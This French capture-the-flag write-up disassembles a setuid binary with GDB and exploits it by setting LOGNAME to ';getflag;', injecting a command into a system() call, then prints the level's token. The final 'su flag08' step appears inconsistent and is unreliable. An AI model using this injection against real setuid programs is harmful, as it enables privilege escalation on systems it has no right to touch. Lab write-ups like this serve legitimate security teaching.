# Level 07

## Étapes pour résoudre le challenge

### 1. Initialisation

Nous commençons avec un fichier exécutable nommé `level07`. Comme ce fichier est binaire, l'afficher directement ne serait pas utile. Nous allons donc l'exécuter pour voir ce qu'il fait.

```bash
./level07
```

**Sortie :**
```
level07
```

Il affiche simplement le nom du programme. Pour aller plus loin, nous devons examiner le code source de l'exécutable.

### 2. Analyse avec GDB

Nous utilisons GDB pour analyser le programme.

```bash
gdb ./level07
```

Nous mettons un point d'arrêt au début de la fonction `main`.

```gdb
(gdb) break main
(gdb) run
(gdb) disassemble main
```

**Sortie (extrait pertinent) :**
```assembly
Dump of assembler code for function main:
   0x08048514 <+0>:	push   %ebp
   0x08048515 <+1>:	mov    %esp,%ebp
   0x08048517 <+3>:	and    $0xfffffff0,%esp
   0x0804851a <+6>:	sub    $0x20,%esp
=> 0x0804851d <+9>:	call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:	mov    %eax,0x18(%esp)
   0x08048526 <+18>:	call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:	mov    %eax,0x1c(%esp)
   0x0804852f <+27>:	mov    0x18(%esp),%eax
   0x08048533 <+31>:	mov    %eax,0x8(%esp)
   0x08048537 <+35>:	mov    0x18(%esp),%eax
   0x0804853b <+39>:	mov    %eax,0x4(%esp)
   0x0804853f <+43>:	mov    0x18(%esp),%eax
   0x08048543 <+47>:	mov    %eax,(%esp)
   0x08048546 <+50>:	call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:	mov    0x1c(%esp),%eax
   0x0804854f <+59>:	mov    %eax,0x8(%esp)
   0x08048553 <+63>:	mov    0x1c(%esp),%eax
   0x08048557 <+67>:	mov    %eax,0x4(%esp)
   0x0804855b <+71>:	mov    0x1c(%esp),%eax
   0x0804855f <+75>:	mov    %eax,(%esp)
   0x08048562 <+78>:	call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:	movl   $0x0,0x14(%esp)
   0x0804856f <+91>:	movl   $0x8048680,(%esp)
   0x08048576 <+98>:	call   0x8048400 <getenv@plt>
   0x0804857b <+103>:	mov    %eax,0x8(%esp)
   0x0804857f <+107>:	movl   $0x8048688,0x4(%esp)
   0x08048587 <+115>:	lea    0x14(%esp),%eax
   0x0804858b <+119>:	mov    %eax,(%esp)
   0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:	mov    0x14(%esp),%eax
   0x08048597 <+131>:	mov    %eax,(%esp)
   0x0804859a <+134>:	call   0x8048410 <system@plt>
   0x0804859f <+139>:	leave  
   0x080485a0 <+140>:	ret    
End of assembler dump.
```

Nous voyons des appels à des fonctions système telles que `getenv`, `asprintf` et `system`. Nous comprenons que le programme manipule des variables d'environnement et exécute des commandes système.

### 3. Exploration des variables d'environnement

Nous listons les variables d'environnement pour voir si nous pouvons les exploiter.

```bash
env
```

**Sortie :**
```
LOGNAME=level07
USER=level07
USERNAME=level07
```

Plusieurs variables d'environnement sont définies à notre nom. Nous allons essayer de les modifier pour exécuter la commande `getflag`.

### 4. Exploitation

Nous modifions la variable d'environnement `LOGNAME` pour y insérer la commande `getflag`.

```bash
export LOGNAME=";getflag;"
./level07
```

**Sortie :**
```
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Nous obtenons le flag : `fiumuikeil55xe9cu4dood66h`.

### 5. Connexion avec le flag

Nous utilisons le flag pour nous connecter au niveau suivant.

```bash
su flag08
```

## Résumé

Pour résoudre ce challenge, nous avons utilisé GDB pour analyser le programme et identifier une vulnérabilité dans l'utilisation des variables d'environnement. En modifiant la variable `LOGNAME`, nous avons pu injecter et exécuter la commande `getflag` pour obtenir le flag.

Le flag pour `level07` est : `fiumuikeil55xe9cu4dood66h`.
